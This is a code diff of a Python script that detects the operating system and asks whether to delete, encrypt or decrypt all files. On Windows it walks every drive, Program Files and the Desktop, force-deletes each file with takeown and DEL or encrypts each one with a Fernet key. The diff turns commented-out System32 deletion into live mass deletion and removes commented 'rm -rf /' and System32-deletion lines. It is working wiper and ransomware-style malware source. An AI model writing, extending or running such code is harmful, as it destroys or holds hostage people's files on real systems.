@@ -6,7 +6,7 @@ from string import ascii_uppercase
 
 def get_windrives_filenames():
     drives = []
-    files = []
+    file_paths = []
     for drive in ascii_uppercase:
         if os.path.exists(os.path.join(str(drive) + ":\\")):
             drives.append(str(drive) + ":\\")
@@ -15,31 +15,34 @@ def get_windrives_filenames():
         if(drive in os.getenv('windir') and not drive == ''):
             progf86_path = drive + 'Program Files (x86)\\' 
             progf_path = drive + 'Program Files\\'
+            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
 
             drives.append(progf86_path)
             drives.append(progf_path)
+            drives.append(desktop_path)
             drives.pop(i)
     for drive in drives:
         for root, _, filenames in os.walk(drive):
             for filename in filenames:
-                files.append(os.path.join(root, filename))
+                file_paths.append(os.path.join(root, filename))
     
-    return [drives, files]
+    return [drives, file_paths]
 
 
 if(platform.system() == 'Windows'):
-    print("Windows OS discovered. Getting System32's path...")
+    print("Windows OS discovered.")
     delenc_choice = input('Delete/Encrypt/Decrypt all files? ').lower()
     sys32_path = os.path.join(os.getenv("windir"), "System32")
+    drives, file_paths = get_windrives_filenames()
     
     if(delenc_choice == 'delete'):
         print('Starting deletion process...')
 
-        # print('Taking ownership of System32...')
-        # subprocess.run(['takeown', r'/f', sys32_path])
-        # print('Deleting System32...')
-        # subprocess.run(['cacls', sys32_path])
-        # print('Done')
+        for file in file_paths:
+            subprocess.run(['takeown', r'/f', file])
+            subprocess.run(['DEL', r'/F', r'/A', file])
+
+        print('Deletion process finished.')
 
     elif(delenc_choice == 'encrypt'):
         print('Starting Encryption process...')
@@ -47,20 +50,19 @@ if(platform.system() == 'Windows'):
         key = Fernet.generate_key()
         keyfunc = Fernet(key)
 
-        drives, filenames = get_windrives_filenames()
 
         print('Initiating encryption on ' + str(drives) + '...')
 
         with open('mykey.txt', 'wb') as mykey:
             mykey.write(key)
 
-        for filename in filenames:
-            with open(filename, 'rb') as original_file:
+        for file in file_paths:
+            with open(file, 'rb') as original_file:
                 original = original_file.read()
 
             encrypted_version = keyfunc.encrypt(original)
 
-            with open(filename, 'wb') as original_file:
+            with open(file, 'wb') as original_file:
                 original_file.write(encrypted_version)
             
     elif(delenc_choice == 'decrypt'):
@@ -69,15 +71,13 @@ if(platform.system() == 'Windows'):
 
         print('Starting decyrption process...')
 
-        drives, filenames = get_windrives_filenames()
-        
-        for filename in filenames:
-            with open(filename, 'rb') as encrypted_file:
+        for file in file_paths:
+            with open(file, 'rb') as encrypted_file:
                 encrypted = encrypted_file.read()
 
             decrypted_version = keyfunc.decrypt(encrypted)
 
-            with open(filename, 'wb') as encrypted_file:
+            with open(file, 'wb') as encrypted_file:
                 encrypted_file.write(decrypted_version)
         
 
@@ -96,7 +96,18 @@ if(platform.system() == 'Windows'):
 
 if(platform.system() == 'Linux'):
     print('Linux OS discovered.')
+    choice = input('Delete/Encrypt/Decrypt all files? ').lower()
 
-    # print('Deleting root...')
-    # subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
-    # print('Done.')
+    if(choice == 'delete'):
+        print('Deleting all files that this user has privilages to access.')
+
+
+    if(choice == 'encrypt'):
+        print('Encrypting all files that this user has privilages to access')
+
+
+    if(choice == 'decrypt'):
+        key = input('What is the decryption key? ')
+    
+
+
